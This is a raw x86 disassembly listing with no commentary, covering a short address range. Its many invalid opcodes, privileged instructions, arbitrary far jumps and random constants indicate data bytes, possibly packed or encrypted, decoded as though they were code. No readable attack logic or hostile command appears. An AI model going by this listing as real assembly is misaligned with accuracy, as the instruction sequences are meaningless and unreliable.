  40d8e0:	test   al,0x2f
  40d8e2:	out    dx,al
  40d8e3:	adc    al,0x35
  40d8e5:	aaa    
  40d8e6:	mov    ebx,0x8aa22131
  40d8eb:	add    BYTE PTR [edi+ecx*1-0x6f],ch
  40d8ef:	xor    DWORD PTR [ecx+0x4bf10510],ebx
  40d8f5:	mov    dl,0x59
  40d8f7:	push   edx
  40d8f8:	cmp    bh,BYTE PTR [ebp-0x56adacd9]
  40d8fe:	push   ebp
  40d8ff:	and    BYTE PTR [eax+0x8fa561d],0xb0
  40d906:	fdiv   DWORD PTR [ebx]
  40d908:	pop    esp
  40d909:	test   eax,0x82cb09a3
  40d90e:	es js  0x40d8de
  40d911:	(bad)  
  40d913:	ja     0x40d918
  40d915:	out    0x85,al
  40d917:	mov    al,0xcb
  40d919:	sbb    al,0x4a
  40d91b:	mov    dh,0x38
  40d91d:	stc    
  40d91e:	fmul   st,st(6)
  40d920:	xor    cl,BYTE PTR [eax-0x15bf1d35]
  40d926:	push   ebx
  40d927:	sti    
  40d928:	mov    al,0x5b
  40d92a:	and    BYTE PTR [eax-0x4a],0xac
  40d92e:	jbe    0x40d8e4
  40d930:	int    0x84
  40d932:	pop    es
  40d933:	and    al,0x6d
  40d935:	jg     0x40d97c
  40d937:	xor    al,0x10
  40d939:	xchg   edx,eax
  40d93a:	adc    cl,ch
  40d93c:	xor    DWORD PTR [ebp+esi*2-0x7d],ecx
  40d940:	cmp    bl,cl
  40d942:	add    eax,DWORD PTR [ebx]
  40d944:	(bad)
  40d947:	stc    
  40d948:	and    WORD PTR [esi+0x17],0x2f71
  40d94e:	adc    DWORD PTR [edi],eax
  40d950:	push   ss
  40d951:	dec    ebp
  40d952:	stos   DWORD PTR es:[edi],eax
  40d953:	pop    esp
  40d954:	or     al,0xaa
  40d956:	(bad)  
  40d957:	adc    ah,BYTE PTR [edi+0x602472e3]
  40d95d:	pop    es
  40d95e:	mov    ah,0xd5
  40d960:	mov    ecx,0x5b67698b
  40d965:	stc    
  40d966:	jmp    0x958f:0x7edec812
  40d96d:	mov    ch,0x17
  40d96f:	(bad)  
  40d970:	jmp    0x40d97e
  40d972:	test   eax,0xc2f49fa0
  40d977:	xor    BYTE PTR [eax+0x62],ch
  40d97a:	imul   esp,eax,0xc6b39101
  40d980:	push   cs
  40d981:	xchg   ecx,eax
  40d982:	lds    eax,FWORD PTR [edx+eiz*8]
  40d985:	push   esp
  40d986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d987:	hlt    
  40d988:	js     0x40d9bf
  40d98a:	adc    BYTE PTR [esi-0x1a],0x1c
  40d98e:	rcr    dh,0x11
  40d991:	mov    al,ds:0x6d1354a2
  40d996:	(bad)  
  40d998:	cwde   
  40d999:	int3   
  40d99a:	push   0x1a
  40d99c:	test   BYTE PTR [eax-0x7c38180d],ah
  40d9a2:	inc    esi
  40d9a3:	xchg   esp,eax
  40d9a4:	shl    edx,cl
  40d9a6:	and    DWORD PTR [ecx+0x7414daa5],0x39
  40d9ad:	cs inc esp
  40d9af:	sub    DWORD PTR [ecx],ecx
  40d9b1:	ins    DWORD PTR es:[edi],dx
  40d9b2:	push   ss
  40d9b3:	ds xchg ax,ax
  40d9b6:	cmp    eax,0x8b51aad3
  40d9bb:	and    al,0xb9
  40d9bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d9be:	and    ebp,ecx
  40d9c0:	out    0x47,al
  40d9c2:	rcl    BYTE PTR [ebx],cl
  40d9c4:	mov    esp,DWORD PTR [esi-0x4d6ecd]
  40d9ca:	fucomi st,st(7)
  40d9cc:	ss test bh,bh
  40d9cf:	jns    0x40d975
  40d9d1:	std    
  40d9d2:	(bad)  
  40d9d3:	es push eax
  40d9d5:	sub    ch,BYTE PTR [ecx]
  40d9d7:	std    
  40d9d8:	js     0x40d9c2
  40d9da:	push   esi
  40d9db:	sub    dh,0xb2
  40d9de:	push   0xa04e8d4a
  40d9e3:	pusha  
  40d9e4:	jg     0x40d9b0
  40d9e6:	cmp    al,BYTE PTR [eax+edx*2-0x3d8795ea]
  40d9ed:	jns    0x40da13
  40d9ef:	test   al,0xe1
  40d9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f2:	popa   
  40d9f3:	and    al,0x22
  40d9f5:	(bad)  
  40d9f6:	sbb    eax,edi
  40d9f8:	sti    
  40d9f9:	nop
  40d9fa:	mov    eax,0x32b497da
  40d9ff:	ss pop ss
  40da01:	jo     0x40d9d7
  40da03:	inc    ebx
  40da04:	xchg   ecx,eax
  40da05:	pusha  
  40da06:	js     0x40d9b0
  40da08:	xor    esp,DWORD PTR [edx]
  40da0a:	shl    cl,cl
  40da0c:	xchg   ecx,eax
  40da0d:	popa   
  40da0e:	gs and al,0xe3
  40da11:	mov    ebp,0x402d2fa
  40da16:	cli    
  40da17:	out    dx,eax
  40da18:	out    dx,eax
  40da19:	pop    ss
  40da1a:	dec    eax
  40da1b:	ret    
  40da1c:	pop    ebx
  40da1d:	mov    dl,0x8a
  40da1f:	test   DWORD PTR [edi+0x725b5777],ebp
  40da25:	ret    
  40da26:	shr    DWORD PTR [ebx+0x6e],cl
  40da29:	aas    
  40da2a:	cld    
  40da2b:	cwde   
  40da2c:	ins    DWORD PTR es:[edi],dx
  40da2d:	push   edx
  40da2e:	shl    BYTE PTR [edx],1
  40da30:	jle    0x40da20
  40da32:	pop    ebp
  40da33:	ja     0x40da8b
  40da35:	ins    DWORD PTR es:[edi],dx
  40da36:	xor    eax,0x343a49cd
  40da3b:	and    eax,0x3efac8d8
  40da40:	jp     0x40dab2
  40da42:	fwait
  40da43:	(bad)  
  40da44:	cmc    
  40da45:	jns    0x40dac5
  40da47:	or     ecx,DWORD PTR [esi-0x7a]
  40da4a:	jns    0x40da16
  40da4c:	neg    dl
  40da4e:	push   0x3c
  40da50:	adc    dh,dl
  40da52:	add    BYTE PTR [ebp-0x567c6091],al
  40da58:	fs call 0xb70664a4
  40da5e:	or     DWORD PTR [edi],ebx
  40da60:	nop
  40da61:	adc    al,0x75
  40da63:	(bad)  
  40da64:	sbb    eax,0xfede5682
  40da69:	cmp    eax,0x9fe80c8f
  40da6e:	imul   edx
  40da70:	mov    ah,0x7b
  40da72:	or     DWORD PTR [ecx+0x3b2ce97b],ebp
  40da78:	mov    ah,0x1f
  40da7a:	or     eax,0xc538eb1f
  40da7f:	in     al,0x8b
  40da81:	xor    al,0x30
  40da83:	push   cs
  40da84:	leave  
  40da85:	cmp    bh,BYTE PTR [edx]
  40da87:	xor    eax,0x4b408eac
  40da8c:	mov    ebx,0x2b42fb14
  40da91:	xchg   DWORD PTR [edx+eax*4-0x6c888967],ebx
  40da98:	sbb    bh,al
  40da9a:	call   0x85ceb32b
  40da9f:	push   es
  40daa0:	mov    ebx,0xfe7d6815
  40daa5:	loop   0x40da2c
  40daa7:	sub    DWORD PTR [edi-0x2ceaca25],ebp
  40daad:	mov    bl,0x83
  40daaf:	imul   edi,DWORD PTR [eax],0x4c465069
  40dab5:	inc    ecx
  40dab6:	jno    0x40da3d
  40dab8:	xor    DWORD PTR es:[edi],ebp
  40dabb:	js     0x40db29
  40dabd:	sub    al,0xdb
  40dabf:	sub    dl,bl
  40dac1:	shl    BYTE PTR [edi-0x35],0xb0
  40dac5:	and    eax,0x6e77d0d6
  40daca:	lock fs jno 0x40db41
  40dace:	ror    DWORD PTR [ebp+0x3c],0x66
  40dad2:	into   
  40dad3:	xor    al,0xdf
  40dad5:	xor    BYTE PTR [edx+esi*2-0x68f012ce],ah
  40dadc:	sub    DWORD PTR [esp+esi*4+0x1df80745],0xffffff8e
  40dae4:	add    cl,cl
  40dae6:	inc    eax
  40dae7:	and    DWORD PTR [esi],eax
  40dae9:	pop    edi
  40daea:	adc    DWORD PTR [edx-0x51278ee0],eax
  40daf0:	pop    edi
  40daf1:	pop    ss
  40daf2:	jl     0x40db08
  40daf4:	add    dl,0xd4
  40daf7:	ins    DWORD PTR es:[edi],dx
  40daf8:	push   esp
  40daf9:	jmp    0x4d7614fe
  40dafe:	sbb    eax,0x89c9bd0d
  40db03:	loop   0x40db0d
  40db05:	dec    ebp
  40db06:	push   ds
  40db07:	mov    cl,0x2e
  40db09:	pop    ss
  40db0a:	mov    ch,0xda
  40db0c:	mov    ecx,?
  40db0e:	int    0x7f
  40db10:	imul   ebp,ebx,0xd2ff5b64
  40db16:	les    esp,FWORD PTR [ecx-0x62]
  40db19:	cwde   
  40db1a:	push   0x842a681c
  40db1f:	fist   WORD PTR [ebx+0x62]
  40db22:	pushf  
  40db23:	mov    bh,0x70
  40db25:	push   esp
  40db26:	aam    0xb3
  40db28:	ins    DWORD PTR es:[edi],dx
  40db29:	or     al,BYTE PTR [ebx-0x554bad48]
  40db2f:	jp     0x40dac7
  40db31:	idiv   dl
  40db33:	fcom   QWORD PTR [edi+ebp*8+0x540ada6f]
  40db3a:	js     0x40db20
  40db3c:	rcr    BYTE PTR [edi+0x377d0c68],cl
  40db42:	mov    cl,0x6c
  40db44:	outs   dx,BYTE PTR ds:[esi]
  40db45:	call   0x4810:0xb63c7594
  40db4c:	sub    ah,BYTE PTR [ebx]
  40db4e:	loopne 0x40daef
  40db50:	sub    al,0x9f
  40db52:	jge    0x40dbc7
  40db54:	fistp  QWORD PTR [ecx-0x1a]
  40db57:	shl    ecx,0x39
  40db5a:	call   0xc35b:0xaa810d9d
  40db61:	push   ebx
  40db62:	lea    ebx,[edi+ebp*8]
  40db65:	sar    DWORD PTR [eax+0x1a],1
  40db68:	scas   al,BYTE PTR es:[edi]
  40db69:	add    ebx,DWORD PTR [ebp+0x21659298]
  40db6f:	sbb    al,0xf3
  40db71:	enter  0x11c4,0xa9
  40db75:	jo     0x40db59
  40db77:	sub    DWORD PTR [esi],0xffffffc0
  40db7a:	sbb    eax,edx
  40db7c:	jbe    0x40dbd4
  40db7e:	xor    eax,0xd01ed466
  40db83:	je     0x40db4a
  40db85:	sbb    dl,ah
  40db87:	sar    DWORD PTR [ebx-0x4],0x30
  40db8b:	pop    esp
  40db8c:	jmp    0x630:0xdea08b20
  40db93:	data16 xor BYTE PTR [ecx+0x26bb2aa3],dh
  40db9a:	sub    al,0xc3
  40db9c:	out    0x3b,eax
  40db9e:	pop    es
  40db9f:	mov    eax,DWORD PTR [ecx+ebp*2+0x5e153823]
  40dba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dba7:	sar    BYTE PTR [ecx-0xe],1
  40dbaa:	pushf  
  40dbab:	push   esi
  40dbac:	call   0x5319:0x6556b4dc
  40dbb3:	ror    ecx,1
  40dbb5:	mov    esi,0x2cd71308
  40dbba:	stc    
  40dbbb:	ja     0x40dbd9
  40dbbd:	adc    DWORD PTR [eax],ebp
  40dbbf:	shl    BYTE PTR [eax-0x2c7a66a6],cl
  40dbc5:	xor    BYTE PTR gs:[edx-0x4ba3a56d],al
  40dbcc:	fwait
  40dbcd:	icebp  
  40dbce:	addr16 cld 
  40dbd0:	xchg   esp,eax
  40dbd1:	mov    esi,DWORD PTR [edi+0x2d]
  40dbd4:	pop    esi
  40dbd5:	push   ebp
  40dbd6:	(bad)  
  40dbd7:	icebp  
  40dbd8:	or     al,0xb0
  40dbda:	addr16 popf 
  40dbdc:	frstor [ebp-0x6a788007]
  40dbe2:	lods   eax,DWORD PTR ds:[esi]
  40dbe3:	stos   BYTE PTR es:[edi],al
  40dbe4:	sbb    al,0xd1
  40dbe6:	cmp    DWORD PTR [edi+edx*8+0x47d582e9],ebx
  40dbed:	sub    DWORD PTR [ebp-0x5f],0xdd201430
  40dbf4:	xor    BYTE PTR [ebp-0x69],dh
  40dbf7:	in     al,0xf4
  40dbf9:	sub    BYTE PTR [ecx+edi*2-0x53],dl
  40dbfd:	mov    ecx,0x79a8d46
  40dc02:	sub    bh,dl
  40dc04:	xlat   BYTE PTR ds:[ebx]
  40dc05:	(bad)  
  40dc06:	data16 shl dl,0xca
  40dc0a:	and    bl,0xfd
  40dc0d:	inc    edx
  40dc0e:	cvtps2pd xmm4,xmm1
  40dc11:	inc    eax
  40dc12:	xor    edx,eax
  40dc14:	fistp  DWORD PTR [esi-0x1]
  40dc17:	setp   BYTE PTR [ebp+0x3e]
  40dc1b:	or     BYTE PTR [edx-0xd],bl
  40dc1e:	ret    
  40dc1f:	xor    ah,BYTE PTR [di]
  40dc22:	or     dh,bl
  40dc24:	shl    BYTE PTR [ebx],cl
  40dc26:	sahf   
  40dc27:	jl     0x40dbd1
  40dc29:	iret   
  40dc2a:	lea    esp,[edi-0x79]
  40dc2d:	mov    ds:0x59f577f0,al
  40dc32:	cdq    
  40dc33:	test   al,0x54
  40dc35:	mov    eax,ds:0x4daf8c1f
  40dc3a:	cmp    al,0x8e
  40dc3c:	add    al,0xd3
  40dc3e:	add    DWORD PTR ds:0x77650087,esi
  40dc44:	fldcw  WORD PTR [ebp+0x5b]
  40dc47:	xchg   ebx,eax
  40dc48:	les    edi,FWORD PTR [edi]
  40dc4a:	push   ss
  40dc4b:	adc    esp,DWORD PTR [esi]
  40dc4d:	(bad)  
  40dc4f:	les    ebx,FWORD PTR [edx+edi*4]
  40dc52:	pop    eax
  40dc53:	jge    0x40dbfe
  40dc55:	sbb    BYTE PTR [esi-0x73],dh
  40dc58:	loopne 0x40dcc2
  40dc5a:	or     ebp,DWORD PTR [eax+0x31]
  40dc5d:	push   edi
  40dc5e:	pop    edi
  40dc5f:	push   ss
  40dc60:	leave  
  40dc61:	mov    cl,0x58
  40dc63:	xor    eax,0x58092fe8
  40dc68:	into   
  40dc69:	repnz dec esi
  40dc6b:	cmp    edx,0x525be1
  40dc71:	push   ss
  40dc72:	adc    al,BYTE PTR [ecx-0xafcaa81]
  40dc78:	sub    DWORD PTR [eax],edi
  40dc7a:	xchg   esp,eax
  40dc7b:	mov    al,0x26
  40dc7d:	aas    
  40dc7e:	fsub   DWORD PTR [edx+0x37]
  40dc81:	cmp    DWORD PTR [edi],0xd
  40dc84:	nop
  40dc85:	pusha  
  40dc86:	push   ss
  40dc87:	pusha  
  40dc88:	in     al,dx
  40dc89:	in     al,0x4a
  40dc8b:	or     eax,0xa124d084
  40dc90:	inc    ebp
  40dc91:	lea    edi,[ebx-0x319ee97c]
  40dc97:	iret   
  40dc98:	jmp    0x40dcf5
  40dc9a:	in     al,0xbf
  40dc9c:	mov    cl,0x0
  40dc9e:	ret    
  40dc9f:	mov    ah,0x93
  40dca1:	fsub   QWORD PTR [eax-0x10]
  40dca4:	add    ch,BYTE PTR [edx+0x6df02129]
  40dcaa:	mov    eax,DWORD PTR [ebx+0x23]
  40dcad:	je     0x40dd2b
  40dcaf:	les    eax,FWORD PTR [edx+0x70]
  40dcb2:	mov    eax,0x6fa4e867
  40dcb7:	hlt    
  40dcb8:	or     eax,0x1b3b66be
  40dcbd:	inc    edi
  40dcbe:	mov    ds:0xf295351a,eax
  40dcc3:	pop    edi
  40dcc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc5:	ror    DWORD PTR [esi],1
  40dcc7:	pop    ebp
  40dcc8:	add    BYTE PTR [edi+edi*2+0x53c26ea4],cl
  40dccf:	or     esp,DWORD PTR es:[ebx+0x164f8094]
  40dcd6:	jo     0x40dc83
  40dcd8:	aam    0x11
  40dcda:	fwait
  40dcdb:	pop    edx
  40dcdc:	nop
  40dcdd:	push   ebp
  40dcde:	(bad)  
  40dce0:	cmp    BYTE PTR [esi+edx*2-0x2c],0x57
  40dce5:	in     eax,0x3
  40dce7:	jns    0x40dccc
  40dce9:	ficomp DWORD PTR [edi]
  40dceb:	and    eax,eax
  40dced:	aad    0x85
  40dcef:	je     0x40dcde
  40dcf1:	in     eax,0xf4
  40dcf3:	or     DWORD PTR [ecx],esi
  40dcf5:	jmp    0xc21:0x84533cf5
  40dcfc:	inc    edi
  40dcfd:	xor    DWORD PTR [ecx],ebp
  40dcff:	push   ebp
  40dd00:	cs mov eax,0x2db1bbe4
  40dd06:	xor    al,0xb7
  40dd08:	cmc    
  40dd09:	push   cs
  40dd0a:	loop   0x40dd29
  40dd0c:	(bad)
  40dd11:	push   esi
  40dd12:	stos   BYTE PTR es:[edi],al
  40dd13:	adc    BYTE PTR [ebp+0x6001a1],dh
  40dd19:	mov    dh,0x16
  40dd1b:	fcom   st(5)
  40dd1d:	icebp  
  40dd1e:	arpl   WORD PTR [edi+ebp*8+0x26],dx
  40dd22:	fcmovu st,st(2)
  40dd24:	mov    ebx,DWORD PTR [edi-0xfed2c0a]
  40dd2a:	lea    esp,[esi+0x7b]
  40dd2d:	ret    0xad5e
  40dd30:	xor    eax,0xf83d019b
  40dd35:	neg    BYTE PTR [esi+edi*1-0x7647481b]
  40dd3c:	loope  0x40ddb8
  40dd3e:	adc    eax,0x948ea119
  40dd43:	jmp    0x28f7:0x5e796ab9
  40dd4a:	clc    
  40dd4b:	adc    BYTE PTR [edi+0x50],bl
  40dd4e:	jl     0x40dceb
  40dd50:	jo     0x40dd50
  40dd52:	(bad)  
  40dd53:	push   cs
  40dd54:	mov    eax,ss:0x395a2703
  40dd5a:	xchg   BYTE PTR [edx-0x8fd2869],dh
  40dd60:	in     eax,0xca
  40dd62:	pushf  
  40dd63:	sub    DWORD PTR [ebx],ebx
  40dd65:	cmp    dh,BYTE PTR [ebx+edi*4-0x22fe3573]
  40dd6c:	push   esi
  40dd6d:	sbb    DWORD PTR [ebx-0x76d710ab],ebx
  40dd73:	pop    esi
  40dd74:	xchg   esi,eax
  40dd75:	popf   
  40dd76:	cmp    al,0xea
  40dd78:	int    0xe0
  40dd7a:	cmc    
  40dd7b:	std    
  40dd7c:	pop    esp
  40dd7d:	mov    dh,0x72
  40dd7f:	daa    
  40dd80:	leave  
  40dd81:	out    0x4d,al
  40dd83:	je     0x40ddd2
  40dd85:	call   0x9a93:0x1e614f71
  40dd8c:	fcom   st(6)
  40dd8e:	add    dl,0x89
  40dd91:	(bad)  
  40dd93:	xor    ebp,DWORD PTR [ebx-0x73]
  40dd96:	ret    
  40dd97:	jnp    0x40dd57
  40dd99:	sbb    ebp,ebp
  40dd9b:	jl     0x40dd86
  40dd9d:	cli    
  40dd9e:	mov    bh,0x1c
  40dda0:	jle    0x40de03
  40dda2:	je     0x40ddab
  40dda4:	dec    ebx
  40dda5:	cmp    eax,0x3ebde8b7
  40ddaa:	mov    ecx,0xf1024180
  40ddaf:	(bad)  
  40ddb0:	lds    ebp,FWORD PTR [eax+0xa]
  40ddb3:	adc    dh,BYTE PTR [edx]
  40ddb5:	pop    gs
  40ddb7:	jo     0x40dd58
  40ddb9:	iret   
  40ddba:	call   0x5bea:0x43fd048
  40ddc1:	pop    esi
  40ddc2:	fidiv  WORD PTR [ecx+0x3787e3c4]
  40ddc8:	das    
  40ddc9:	dec    eax
  40ddca:	xchg   esp,eax
  40ddcb:	int    0x6a
  40ddcd:	mov    edi,0x1634c01b
  40ddd2:	in     al,0x49
  40ddd4:	mov    ds,WORD PTR [esi+0x53]
  40ddd7:	iret   
  40ddd8:	lahf   
  40ddd9:	ficomp DWORD PTR [eax-0x1fdaad21]
  40dddf:	add    BYTE PTR [edx+0x2f661dbb],0x0
  40dde6:	sbb    BYTE PTR [eax],al
  40dde8:	repz fst QWORD PTR [ebp+0x27]
  40ddec:	aaa    
  40dded:	ins    BYTE PTR es:[edi],dx
  40ddee:	mov    WORD PTR [ecx+0x0],ss
  40ddf1:	popa   
  40ddf2:	ja     0x40dd75
  40ddf4:	jae    0x40de19
  40ddf6:	mov    esp,0x36580eb2
  40ddfb:	fild   DWORD PTR [edx+ecx*2+0x63fa8e75]
  40de02:	sahf   
  40de03:	xchg   ebx,eax
  40de04:	xchg   DWORD PTR [ebp-0x74],eax
  40de07:	xchg   esi,eax
  40de08:	mov    eax,ds:0xa7ae7d17
  40de0d:	jns    0x40de26
  40de0f:	jbe    0x40de4f
  40de11:	cli    
  40de12:	jge    0x40de22
  40de14:	pop    esi
  40de15:	js     0x40de59
  40de17:	(bad)  
  40de18:	jmp    0x4972fa63
  40de1d:	jle    0x40de5e
  40de1f:	ret    0xd295
  40de22:	jnp    0x40de7d
  40de24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de25:	sbb    ebp,DWORD PTR [edx+edi*1]
  40de28:	arpl   WORD PTR [ecx+0x68],sp
  40de2b:	mov    cl,0xda
  40de2d:	bnd jns 0x40de45
  40de30:	adc    al,0xb
  40de32:	imul   edx,DWORD PTR [ebx+0x4d],0x2e
  40de36:	sub    ah,BYTE PTR [ecx-0x8acff50]
  40de3c:	add    DWORD PTR [edi-0x7b],0x740c13e8
  40de43:	dec    edx
  40de44:	stc    
  40de45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de46:	test   eax,0xf05652b7
  40de4b:	(bad)  
  40de4c:	ror    BYTE PTR [esi+esi*4-0x38492ddc],cl
  40de53:	out    0x45,al
  40de55:	mov    edi,0xedcd6d3f
  40de5a:	fistp  WORD PTR [eax+eax*1+0xe4ce2ee]
  40de61:	inc    eax
  40de62:	fchs   
  40de64:	dec    edi
  40de65:	pop    bp
  40de67:	cmp    eax,0x6de212bc
  40de6c:	sbb    bl,BYTE PTR [eax-0x7d]
  40de6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de70:	push   edi
  40de71:	inc    edi
  40de72:	ret    
  40de73:	add    BYTE PTR [esp+ebx*4],bl
  40de76:	sti    
  40de77:	inc    ecx
  40de78:	sbb    esp,DWORD PTR [ebp+0x1d]
  40de7b:	mov    ax,ds:0x6d42275
  40de81:	les    ebp,FWORD PTR [ebx+0x77]
  40de84:	ret    0x8a93
  40de87:	pop    edx
  40de88:	jge    0x40decd
  40de8a:	(bad)  
  40de8b:	jge    0x40de48
  40de8d:	pop    ss
  40de8e:	sbb    DWORD PTR [edx],edx
  40de90:	jp     0x40dee4
  40de92:	daa    
  40de93:	pop    DWORD PTR [ecx+0x68cc12ff]
  40de99:	jecxz  0x40dea0
  40de9b:	mov    eax,0x99926859
  40dea0:	(bad)  
  40dea1:	sub    eax,0x294f7f8f
  40dea6:	int3   
  40dea7:	pop    edi
  40dea8:	pop    ecx
  40dea9:	mov    ds,WORD PTR [edx-0x56]
  40deac:	and    al,0xd3
  40deae:	xor    BYTE PTR [eax-0xaeb70de],cl
  40deb4:	jo     0x40deb0
  40deb6:	popf   
  40deb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40deb8:	pushf  
  40deb9:	push   ebx
  40deba:	sub    al,0x29
  40debc:	sub    DWORD PTR [edx-0x59],ebp
  40debf:	rcl    DWORD PTR [eax-0x4bf836f8],1
  40dec5:	xor    edi,DWORD PTR [edi-0x3b9a7d1c]
  40decb:	retf   
  40decc:	mov    al,ds:0x3762b265
  40ded1:	mov    edi,0x1cb44eb3
  40ded6:	jmp    0xf68f55d4
  40dedb:	xchg   esi,eax
  40dedc:	jg     0x40df52
  40dede:	mov    esi,0xfa4adcf6
  40dee3:	jmp    0xcfc2:0x9371cddf
  40deea:	(bad)  
  40deeb:	mov    al,0xb8
  40deed:	sbb    eax,DWORD PTR [ecx]
  40deef:	jle    0x40deb2
  40def1:	iret   
  40def2:	sbb    cl,BYTE PTR [edx-0x23259c85]
  40def8:	jo     0x40df3d
  40defa:	out    0x20,eax
  40defc:	sub    ebp,DWORD PTR [esi+0x48]
  40deff:	arpl   WORD PTR [ebp+0x1f695d1b],si
  40df05:	mov    BYTE PTR [ebp-0x257c4ec8],bh
  40df0b:	sbb    BYTE PTR [eax+0x361ca390],dh
  40df11:	out    dx,eax
  40df12:	out    dx,al
  40df13:	stos   BYTE PTR es:[edi],al
  40df14:	jae    0x40df3e
  40df16:	adc    DWORD PTR [ebp-0x66fd4064],eax
  40df1c:	sub    dh,BYTE PTR [ebp+0x6e9f6411]
  40df22:	inc    esi
  40df23:	cmp    bh,ch
  40df25:	ficomp DWORD PTR [eax-0x3e36a003]
  40df2b:	sar    DWORD PTR [ebp-0x6c],cl
  40df2e:	test   BYTE PTR [edi],bl
  40df30:	lock inc esp
  40df32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df33:	lea    ebx,[eax]
  40df35:	mov    al,0x52
  40df37:	push   cs
  40df38:	outs   dx,DWORD PTR ds:[esi]
  40df39:	loope  0x40df4f
  40df3b:	pushf  
  40df3c:	nop
  40df3d:	neg    BYTE PTR [ecx-0x36]
  40df40:	popf   
  40df41:	(bad)
  40df44:	dec    ebx
  40df45:	cld    
  40df46:	pop    ecx
  40df47:	fst    DWORD PTR [ecx-0x1a]
  40df4a:	sub    DWORD PTR [esi+0x62],edi
  40df4d:	mov    ds:0x57ef02d8,eax
  40df52:	mov    esp,0xcb14ca96
  40df57:	sub    dh,dl
  40df59:	push   ss
  40df5a:	(bad)  
  40df5b:	in     eax,dx
  40df5c:	(bad)  
  40df5d:	cmp    dl,BYTE PTR [edx+0x532450a7]
  40df63:	inc    eax
  40df64:	mov    ah,0x41
  40df66:	arpl   bp,sp
  40df68:	and    DWORD PTR [edi+0x31299641],edx
  40df6e:	cmc    
  40df6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df72:	push   esi
  40df73:	push   0xffffff93
  40df75:	push   edi
  40df76:	nop
  40df77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df78:	rcl    BYTE PTR [ebp+0x50b04df],1
  40df7e:	pop    eax
  40df7f:	daa    
  40df80:	imul   ecx,DWORD PTR [eax+0x7c],0x7f
  40df84:	loopne 0x40df73
  40df86:	pop    edx
  40df87:	sub    DWORD PTR [edx+0x1d722f76],ebp
  40df8d:	in     eax,dx
  40df8e:	rcr    BYTE PTR [ecx-0x73b66696],0x6f
  40df95:	test   DWORD PTR [edx],esi
  40df97:	retf   0xea1e
  40df9a:	xchg   edx,eax
  40df9b:	cmc    
  40df9c:	loopne 0x40df67
  40df9e:	mov    ebp,0xbd0b92da
  40dfa3:	adc    al,0xcb
  40dfa5:	and    edx,DWORD PTR [esi]
  40dfa7:	and    dh,ch
  40dfa9:	push   0x7b
  40dfab:	xor    cl,dh
  40dfad:	dec    ecx
  40dfae:	shl    BYTE PTR [eax-0x43],1
  40dfb1:	dec    BYTE PTR [edi]
  40dfb3:	add    BYTE PTR [ecx],al
  40dfb5:	jmp    0x40dfd2
  40dfb7:	sub    ecx,0xffffffc4
  40dfba:	jae    0x40dfdd
  40dfbc:	jge    0x40df7e
  40dfbe:	xor    eax,0x1a152b9b
  40dfc3:	xchg   esi,ecx
  40dfc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfc6:	sub    eax,0x3de02e69
  40dfcb:	push   esi
  40dfcc:	mov    bl,0x64
  40dfce:	enter  0x1636,0x2c
  40dfd2:	push   ebx
  40dfd3:	sub    dh,BYTE PTR [edx+0x61]
  40dfd6:	pop    ds
  40dfd7:	hlt    
  40dfd8:	(bad)  
  40dfd9:	arpl   dx,dx
  40dfdb:	jg     0x40df7a
  40dfdd:	pushf  
  40dfde:	bound  eax,QWORD PTR [eax]
  40dfe0:	sub    edi,DWORD PTR [esi+0xd643593]
  40dfe6:	bound  eax,QWORD PTR [ecx-0x47]
  40dfe9:	sbb    dh,BYTE PTR [edi-0x77507a02]
  40dfef:	dec    edi
  40dff0:	mov    al,ds:0x8097ac44
  40dff5:	push   esp
  40dff6:	fstp   QWORD PTR [ebx-0x80]
  40dff9:	mov    edi,0xff56b943
  40dffe:	mov    edi,0xe160894
  40e003:	push   ss
  40e004:	add    DWORD PTR [ebx+0x274fcdfa],edi
  40e00a:	cld    
  40e00b:	cs inc eax
  40e00d:	xchg   ecx,eax
  40e00e:	jbe    0x40dfc4
  40e010:	fistp  DWORD PTR ds:0x4147b495
  40e016:	loope  0x40dfe1
  40e018:	imul   esp,DWORD PTR [edi+0x51],0x44
  40e01c:	hlt    
  40e01d:	stc    
  40e01e:	jnp    0x40dfe5
  40e020:	gs sbb ecx,0x209de698
  40e027:	mov    bl,0x5
  40e029:	aas    
  40e02a:	leavew 
  40e02c:	pop    ebx
  40e02d:	loopne 0x40e094
  40e02f:	cld    
  40e030:	sahf   
  40e031:	pop    esi
  40e032:	stc    
  40e033:	out    dx,al
  40e034:	dec    esi
  40e035:	fidiv  DWORD PTR [eax-0x5a]
  40e038:	jmp    0xd47d8782
  40e03d:	shr    DWORD PTR [edi-0x57eca940],cl
  40e043:	xchg   ecx,eax
  40e044:	cs pop ds
  40e046:	add    al,0xd0
  40e048:	mov    ds:0x95a4d8c5,eax
  40e04d:	mov    bl,BYTE PTR [edx]
  40e04f:	inc    BYTE PTR [ebp-0x4c7890bd]
  40e055:	cmp    DWORD PTR [esi],ebp
  40e057:	js     0x40e084
  40e059:	pop    ds
  40e05a:	adc    eax,0xcaf7b404
  40e05f:	in     al,0x39
  40e061:	cli    
  40e062:	dec    esp
  40e063:	cli    
  40e064:	and    dh,dh
  40e066:	or     bh,BYTE PTR [eax]
  40e068:	add    al,0xed
  40e06a:	push   edi
  40e06b:	mov    esi,0x36c9568a
  40e070:	(bad)  
  40e071:	xchg   DWORD PTR [edi+0x1c],ecx
  40e074:	cmp    al,0xe4
  40e076:	jg     0x40e076
  40e078:	sti    
  40e079:	add    bl,BYTE PTR [esi+edx*1-0x7]
  40e07d:	out    dx,al
  40e07e:	aam    0x3a
  40e080:	shr    BYTE PTR [edx-0x1c],cl
  40e083:	push   0xffffffb7
  40e085:	mov    WORD PTR [eax+0x30c05383],gs
  40e08b:	das    
  40e08c:	pop    ecx
  40e08d:	cwde   
